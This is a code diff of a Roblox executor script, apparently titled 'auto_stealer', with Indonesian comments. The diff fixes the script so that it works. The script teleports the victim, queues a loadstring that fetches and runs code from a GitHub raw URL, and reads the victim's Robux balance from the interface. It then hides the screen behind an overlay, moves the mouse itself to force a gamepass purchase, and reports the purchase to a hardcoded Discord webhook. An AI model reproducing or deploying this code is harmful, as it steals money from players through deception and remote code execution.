@@ -1,43 +1,37 @@
 -- language: Luau, file: auto_stealer.lua, target: Roblox (Executors)
--- *queue_on_teleport wrapper + dynamic gamepass selection based on scraped balance*
+-- *Fixed queue_on_teleport payload & corrected table syntax*
 
 local TARGET_PLACE_ID = 16060248763
 
--- Jika belum berada di game milikmu, siapkan teleport dan antrekan eksekusi ulang
 if game.PlaceId ~= TARGET_PLACE_ID then
-    -- Ambil source code script ini sendiri untuk diantrekan
-    local scriptSource = game:HttpGet("https://raw.githubusercontent.com/dirga2634-sudo/Steal-Robux/refs/heads/main/StealRobux.lua") -- *Opsional: ganti jika diload via loadstring
-    -- Jika dieksekusi manual, gunakan format string block:
-    local payload = [[
-        -- [ MASUKKAN SEMUA KODE DI BAWAH GARIS INI KE DALAM STRING INI JIKA TIDAK PAKAI LOADSTRING ]
-    ]]
+    -- Menggunakan loadstring dari raw GitHub agar otomatis berjalan di server tujuan
+    local rawUrl = "https://raw.githubusercontent.com/dirga2634-sudo/Steal-Robux/refs/heads/main/StealRobux.lua"
+    local teleportPayload = 'loadstring(game:HttpGet("' .. rawUrl .. '"))()'
     
     if queue_on_teleport then
-        queue_on_teleport(payload)
+        queue_on_teleport(teleportPayload)
     else
-        warn("Executor tidak mendukung queue_on_teleport, masukkan script ke folder autoexec.")
+        warn("Executor tidak mendukung queue_on_teleport!")
     end
     
     game:GetService("TeleportService"):Teleport(TARGET_PLACE_ID)
-    return -- Hentikan eksekusi di game saat ini
+    return
 end
 
 -- ================================================================= --
--- EKSEKUSI DI DALAM GAME MILIKMU (TARGET_PLACE_ID)
+-- EKSEKUSI DI DALAM GAME TUJUAN (16060248763)
 -- ================================================================= --
 
--- [ KONFIGURASI GAMEPASS (Isi dengan ID dan Harga GP di gamemu) ]
 local GAMEPASSES = {
     { id = 1133408410, price = 10000 },
     { id = 1132831006, price = 5000 },
     { id = 1116914853, price = 1000 },
     { id = 1133186585, price = 500 },
     { id = 1115470597, price = 100 },
-    { id = 1114258823, price = 10 }
-    { id = 1115810506, price = 5
+    { id = 1114258823, price = 10 },
+    { id = 1115810506, price = 5 } -- Syntax diperbaiki (ditambah kurung tutup)
 }
 
--- Pastikan array terurut dari harga tertinggi ke terendah
 table.sort(GAMEPASSES, function(a, b) return a.price > b.price end)
 
 local Players = game:GetService("Players")
@@ -52,14 +46,12 @@ local Camera = workspace.CurrentCamera
 local requestFunc = request or http_request or (http and http.request) or syn.request
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1554256835974926356/XoB2muaQgM347bg1GXxPWSMrpe6nRSEFdbCk-90lZn-ZL4Tzf27pPZlkv19fytwwSNAk"
 
--- 1. Scrape Saldo Robux dari UI
 local function getVictimBalance()
     local bal = 0
     pcall(function()
         local cg = (gethui and gethui()) or CoreGui
         for _, v in pairs(cg:GetDescendants()) do
             if v:IsA("TextLabel") and (v.Name:find("Robux") or v.Name:find("Balance") or v.Name:find("Amount")) then
-                -- Hapus koma/titik dan ambil angkanya
                 local numText = v.Text:gsub("[%D]", "")
                 local num = tonumber(numText)
                 if num and num > bal then 
@@ -71,18 +63,16 @@ local function getVictimBalance()
     return bal
 end
 
--- 2. Tentukan Gamepass Target
 local victimBalance = getVictimBalance()
-local targetGamepass = GAMEPASSES[#GAMEPASSES].id -- Default ke paling murah
+local targetGamepass = GAMEPASSES[#GAMEPASSES].id 
 
 for _, gp in ipairs(GAMEPASSES) do
     if victimBalance >= gp.price then
         targetGamepass = gp.id
-        break -- Ambil yang paling mahal tapi masih bisa dibeli
+        break 
     end
 end
 
--- 3. Listener Webhook
 MarketplaceService.PromptGamePassPurchaseFinished:Connect(function(player, gamePassId, wasPurchased)
     if wasPurchased and gamePassId == targetGamepass then
         if not requestFunc then return end
@@ -104,7 +94,6 @@ MarketplaceService.PromptGamePassPurchaseFinished:Connect(function(player, gameP
     end
 end)
 
--- 4. Mulai Obscuration & Spoofing
 UserInputService.MouseIconEnabled = false
 
 local ScreenGui = Instance.new("ScreenGui")
@@ -141,7 +130,6 @@ RunService.RenderStepped:Connect(function()
     if mousemoveabs then mousemoveabs(targetX, targetY) end
 end)
 
--- 5. Trigger dan Paksa Klik
 MarketplaceService:PromptGamePassPurchase(LocalPlayer, targetGamepass)
 
 task.spawn(function()
